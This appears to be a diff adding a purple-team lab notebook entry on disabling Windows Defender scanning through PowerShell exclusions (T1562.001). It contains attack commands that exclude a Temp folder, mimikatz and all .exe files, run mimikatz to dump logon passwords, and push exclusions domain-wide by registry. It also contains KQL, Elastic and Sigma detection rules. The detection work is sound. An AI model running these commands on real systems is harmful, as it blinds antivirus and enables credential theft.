@@ -2291,6 +2291,235 @@ NULL
 
 ---
 
+## Mechanics: Item #108 — Defender Exclusion via PowerShell (T1562.001) [STUB — UNTESTED]
+
+**Status:** ⏳ STUB — added 2026-06-24 session 12. Source: [Detect FYI](https://detect.fyi/testing-ai-threat-hunting-against-real-world-kql-a-side-by-side-test-4cdda76a5772) by Alex Teixeira, 2026-06-24.
+
+**Why it works:**
+- Windows Defender's `MpPreference` COM interface allows runtime configuration of exclusion lists (paths, processes, extensions, IPs).
+- An attacker with admin/DA on a machine calls `Add-MpPreference` from PowerShell to whitelist the directory/process they'll use for attack tools.
+- This is a **more realistic** alternative to disabling Defender entirely — Defender stays "on" but ignores the attacker's payload.
+- Real-world example: APT groups use this to bypass Defender during the "run malware" phase without triggering Tamper Protection alerts.
+
+**Attack workflow (Phase 3 — runtime exclusion before payload):**
+```powershell
+# Pre-check: Defender running, no exclusions
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+# Expected: empty
+
+# Step 1: Add user-writable folder to exclusion (typical TTP)
+Add-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"
+
+# Step 2: Add specific process (binary name)
+Add-MpPreference -ExclusionProcess "mimikatz.exe"
+
+# Step 3: Add file extension
+Add-MpPreference -ExclusionExtension ".exe"
+
+# Step 4: Verify exclusions applied
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
+
+# Step 5: Run mimikatz from excluded path (Defender ignores it)
+Copy-Item C:\Tools\mimikatz.exe C:\Users\analyst_cloud\AppData\Local\Temp\m.exe
+C:\Users\analyst_cloud\AppData\Local\Temp\m.exe sekurlsa::logonpasswords
+
+# Cleanup
+Remove-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"
+Remove-MpPreference -ExclusionProcess "mimikatz.exe"
+Remove-MpPreference -ExclusionExtension ".exe"
+```
+
+**Phase 5 alt — persistence via Group Policy:**
+```powershell
+# Set exclusion via GPO (applies to all domain machines)
+# GPO path: Computer Configuration > Policies > Administrative Templates > 
+#           Windows Components > Microsoft Defender Antivirus > Exclusions
+# Push via Set-GPRegistryValue or direct registry write:
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" `
+                 -Name "C:\Users\analyst_cloud\AppData\Local\Temp" -Value 0
+```
+
+#### KQL hunt query (Microsoft Defender XDR — from article, 15 lines)
+```kql
+let IOARegex = @"(?i)(add|set)-MpPreference[\s\S]+ExclusionPath";
+let PathRegex = @"(?i)(c:|\$env:(HOMEDRIVE|SYSTEMROOT)).*\\(users|programdata|windows[\]+temp|\$Recycle\.Bin)\\|\$env:(TEMP|TMP|APPDATA|LOCALAPPDATA|PROGRAMDATA|PUBLIC|USERPROFILE|HOMEPATH|ALLUSERSPROFILE|ONEDRIVE|DESKTOP|DOCUMENTS|DOWNLOADS|FAVORITES)";
+search in (DeviceProcessEvents, DeviceEvents) "MpPreference" and "ExclusionPath" and ("add" or "set")
+| where Timestamp > ago(30d)
+| where ActionType has_any("PowerShellCommand", "ProcessCreated", "ScriptContent")
+| extend ScriptContent = parse_json(AdditionalFields)["ScriptContent"]
+| extend AFCommand = parse_json(AdditionalFields)["Command"]
+| extend PsCommand = case(
+    ScriptContent matches regex IOARegex, ScriptContent,
+    ProcessCommandLine matches regex IOARegex, ProcessCommandLine,
+    AFCommand matches regex IOARegex, AFCommand,
+    InitiatingProcessCommandLine)
+| where PsCommand matches regex PathRegex
+| summarize DevCount = dcount(DeviceId), arg_max(Timestamp, *) by PsCommand
+| sort by DevCount
+```
+
+**KQL→Elastic KQL port (for plan1.7 §17):**
+```json
+{
+  "rule_id": "cadre-009",
+  "title": "Windows Defender Folder Exclusion Attempts (T1562.001)",
+  "description": "Detects PowerShell calls to Add-MpPreference/Set-MpPreference with -ExclusionPath",
+  "severity": "high",
+  "risk_score": 75,
+  "query": "process.command_line:*MpPreference*ExclusionPath* and process.name:\"powershell.exe\"",
+  "index": ["logs-endpoint.events.process-*", "winlogbeat-*"],
+  "filter": {
+    "winlog.event_id": ["1", "4688"]
+  },
+  "language": "kuery",
+  "false_positives": [
+    "Legitimate admin creating temporary exclusion for software install",
+    "Defender policy update via GPO (Centralized IT)"
+  ]
+}
+```
+
+**Sigma rule (Track C — plan1.7 §16):**
+```yaml
+title: Windows Defender Folder Exclusion via PowerShell
+id: 7c8d9e0f-1a2b-3c4d-5e6f-7890abcdef01
+status: experimental
+description: Detects PowerShell calling Add-MpPreference/Set-MpPreference with -ExclusionPath on user-writable paths
+references:
+  - https://attack.mitre.org/techniques/T1562/001/
+  - https://detect.fyi/testing-ai-threat-hunting-against-real-world-kql-a-side-by-side-test-4cdda76a5772
+author: Alex Teixeira (original KQL), CADRE translation
+date: 2026/06/24
+tags:
+  - attack.defense_evasion
+  - attack.t1562.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith:
+      - 'powershell.exe'
+      - 'pwsh.exe'
+    CommandLine|contains:
+      - 'Add-MpPreference'
+      - 'Set-MpPreference'
+    CommandLine|contains:
+      - 'ExclusionPath'
+  path_filter:
+    CommandLine|contains:
+      - '\Users\'
+      - '\AppData\'
+      - '\Temp\'
+      - '\$Recycle.Bin'
+      - '%TEMP%'
+      - '%USERPROFILE%'
+      - '$env:TEMP'
+  condition: selection and path_filter
+falsepositives:
+  - Legitimate software installation requiring Defender exclusion
+  - Centralized IT applying Defender policy
+level: high
+```
+
+**Success modes (attacker):**
+- Exclusion applied → payload runs without Defender detection
+- Persistence via GPO → applies to all domain machines
+- Combined with binary signing bypass → completely stealthy
+
+**Failure modes (defender):**
+- WinSec 5001 alert (Defender config change) → SOC investigates
+- Tamper Protection ON → runtime exclusion blocked
+- PowerShell Constrained Language Mode → Defender cmdlets unavailable
+- ASR rules block `Add-MpPreference` invocation
+- Registry monitoring catches `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`
+
+**CADRE-specific notes:**
+- We disable Defender per `04-vulnerabilities.yml` (Tamper Protection workaround). Runtime exclusion is a more "blue team" realistic scenario.
+- For testing: re-enable Defender on mbr01, then run the `Add-MpPreference` flow as test.
+- **Tool staging:** mimikatz already at `C:\Tools\` on mbr01. Move to `C:\Users\analyst_cloud\AppData\Local\Temp\` for exclusion test.
+- **Detection engineering:** Elastic KQL rule `cadre-009` candidate for plan1.7 §17.
+- **Sigma rule:** `win_defender_folder_exclusion.yml` candidate for plan1.7 §16.
+
+**Telemetry fingerprint (expected):**
+- **WinSec 5001** — Windows Defender configuration change (event created when exclusions added)
+- **WinSec 4688** — `powershell.exe` process create with `Add-MpPreference` in command line
+- **Sysmon EID 1** — Same as 4688
+- **Sysmon EID 13** — Registry value set at `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`
+- **Sysmon EID 11** — File create at excluded path (if mimikatz is copied there)
+- **Endpoint events** — `process.command_line` containing `MpPreference` + `ExclusionPath`
+
+**Detection engineering (held for plan1.7 §17 + §16):**
+- Suricata: not applicable (host-based, not network)
+- Zeek: not applicable
+- Elastic KQL: `cadre-009` (above) + Sysmon EID 13 correlation
+- Sigma rule: `win_defender_folder_exclusion.yml` (above)
+- DFIR-Nexus: `sigma_translate` MCP tool converts Sigma → Elastic KQL
+
+**KQL pattern reference (from article — port to Elastic):**
+| Article KQL | Elastic equivalent | Use case |
+|---|---|---|
+| `arg_max(Timestamp, *)` | `top_hits(1, sort:["@timestamp":"desc"])` | Show full event at latest occurrence |
+| `dcount(DeviceId)` | `cardinality(agent.id)` | Prevalence via device count (NOT event count) |
+| `parse_json(AdditionalFields)["ScriptContent"]` | `JsonProperty(winlog.event_data.ScriptContent)` | Extract nested JSON field |
+| `search in (TableA, TableB) "term"` | `(TableA:term OR TableB:term)` | Cross-table search |
+| `summarize ... by PsCommand` | `aggregate by process.command_line.keyword` | Group by normalized command |
+| `sort by DevCount` | `sort: { "cardinality": "desc" }` | Sort by prevalence |
+
+**Common pitfalls:**
+- **Use `ActionType` field, not `FileName`** — file name is too narrow (catches `pwsh.exe`, `powershell_ise.exe` too)
+- **Prevalence = device count, not event count** — `count()` includes noise from loops/scripts
+- **Include environment variable variants** — `$env:TEMP`, `%TEMP%`, `%LOCALAPPDATA%` all need separate patterns
+- **Don't miss `DeviceEvents` table** — has `PowerShellCommand`, `ScriptContent` action types not in `DeviceProcessEvents`
+- **AI LLM is BAD at this query** — both Claude and ChatGPT missed 75% of real matches; use human-written query as template
+
+**Wireshark field reference:**
+- Not applicable (host-based, not network)
+
+**Reproduction checklist (Phase 3 test):**
+- [ ] Phase 1-2.5 complete (admin/SYSTEM on mbr01)
+- [ ] Re-enable Defender on mbr01 (revert `04-vulnerabilities.yml` changes)
+- [ ] Verify Defender running: `Get-MpComputerStatus`
+- [ ] Run `Add-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"`
+- [ ] Verify exclusion applied: `Get-MpPreference | Select-Object -ExpandProperty ExclusionPath`
+- [ ] Copy mimikatz to excluded path, run, verify no Defender alert
+- [ ] Capture WinSec 5001, 4688, Sysmon EID 1, 13 telemetry
+- [ ] Cleanup: `Remove-MpPreference -ExclusionPath` + re-disable Defender for lab
+- [ ] Document telemetry in `tracker.md`
+- [ ] Deploy `cadre-009` Elastic KQL rule
+- [ ] Convert Sigma rule via `sigma_translate` MCP tool
+
+**Reproduction checklist (plan1.7 detection rule deployment):**
+- [ ] Deploy Elastic KQL `cadre-009` on `logs-endpoint.events.process-*`
+- [ ] Convert Sigma rule via DFIR-Nexus `sigma_translate` MCP
+- [ ] Validate with Atomic Red Team test T1562.001-1: `Invoke-AtomicTest T1562.001 -ShowDetails`
+- [ ] Cross-validate against the article's human query logic
+- [ ] Tune false positive rate (legit admin software install)
+
+**AI-vs-Human meta-finding (CRITICAL for CADRE-Strike + DFIR-Nexus):**
+- **ChatGPT (GPT-5.5):** 55-line KQL query — didn't even run (syntax error)
+- **Claude (Sonnet 4.6):** 121-line KQL query — ran but had 9/12 false-negatives (75% miss rate)
+- **Human:** 15-line KQL query — 12/12 real matches, comprehensive
+- **Author's conclusion:** "Use AI to **review and improve** human queries, not generate from scratch"
+- **For CADRE-Strike (Track H):** when LLM agent generates attack steps, expect 75% miss rate on detection coverage. **HITL review required for novel attack chains.**
+- **For DFIR-Nexus:** when LLM generates hunt queries, expect "syntactically correct, semantically plausible-looking queries that are completely useless in practice." **Human review gate before deploying to production rules.**
+- **For this session (us):** we're using Claude Code to write detection rules — treat my own output with same skepticism. Cross-check against the article's human query logic.
+
+**Cross-references:**
+- Campaign_suggestions.md #108 (full entry with MITRE mapping)
+- Item #106 (Atomic Red Team) — T1562.001 covered by Atomic Red Team test T1562.001-1
+- Item #101 (Practical Purple Teaming) — Ch 6 telemetry correlation patterns
+- plan1.7 §17 (held) — Detection Engineering rules
+- plan1.7 §16 (held) — Sigma Rule Library
+- Track C (Sigma) — `win_defender_folder_exclusion.yml` candidate
+- Track H (CADRE-Strike) — HITL pattern validation
+- External reference #125 (held) — add to `external-references.md`
+- Phase 3 (Execution) — runtime exclusion as attack primitive
+- Phase 5 (Persistence) — GPO-pushed exclusion
+
+---
+
 
 ## Mechanics: Phase 3.5 — Credential Theft from SYSTEM
 
